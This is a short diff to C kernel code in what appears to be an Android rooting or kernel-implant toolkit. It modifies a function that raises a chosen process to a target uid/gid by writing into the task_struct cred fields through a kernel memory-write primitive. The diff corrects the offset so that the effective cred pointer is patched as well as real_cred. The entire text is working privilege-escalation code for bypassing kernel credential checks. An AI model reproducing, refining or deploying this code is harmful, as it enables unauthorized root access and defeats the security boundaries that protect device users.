@@ -216,21 +216,24 @@ int neverc_krt_su_elevate_pid(int pid, u32 target_uid, u32 target_gid)
 	if (ret) return ret;
 
 	/*
-	 * Also patch real_cred.  In task_struct the layout is:
-	 *   const struct cred __rcu *ptracer_cred;  (off_cred - 16)
-	 *   const struct cred __rcu *real_cred;     (off_cred - 8)
-	 *   const struct cred __rcu *cred;          (off_cred)
-	 * Stable across GKI 5.10-6.12.
+	 * Also patch the effective cred pointer.  The probe stores
+	 * _neverc_krt_off_cred at the first matching pair (real_cred).
+	 * The actual cred field is at the NEXT slot (off_cred + 8).
+	 * Layout (stable across GKI 5.10-6.12):
+	 *   ptracer_cred  (off_cred - 8)  — usually NULL
+	 *   real_cred     (off_cred)      — what we already patched
+	 *   cred          (off_cred + 8)  — patch this too
 	 */
-	const void *real_cred;
-	unsigned long real_off = _neverc_krt_off_cred - 8;
-	if (neverc_krt_mem_read(&real_cred, (void *)((unsigned long)task + real_off), 8))
+	unsigned long eff_cred_ptr;
+	unsigned long eff_off = _neverc_krt_off_cred + 8;
+	if (neverc_krt_mem_read(&eff_cred_ptr,
+			(void *)((unsigned long)task + eff_off), 8))
 		return 0;
-	unsigned long real_addr = (unsigned long)real_cred & ~(0xFFUL << 56);
-	if (real_cred && real_cred != cred &&
-	    real_addr >= 0xFFFF000000000000UL &&
-	    real_addr < 0xFFFFFFFFFFFFF000UL)
-		neverc_krt_mem_write_protected(real_addr + base,
+	unsigned long eff_addr = eff_cred_ptr & ~(0xFFUL << 56);
+	if (eff_cred_ptr && eff_addr != cred_addr &&
+	    eff_addr >= 0xFFFF000000000000UL &&
+	    eff_addr < 0xFFFFFFFFFFFFF000UL)
+		neverc_krt_mem_write_protected(eff_addr + base,
 					ids, sizeof(ids));
 	return 0;
 }
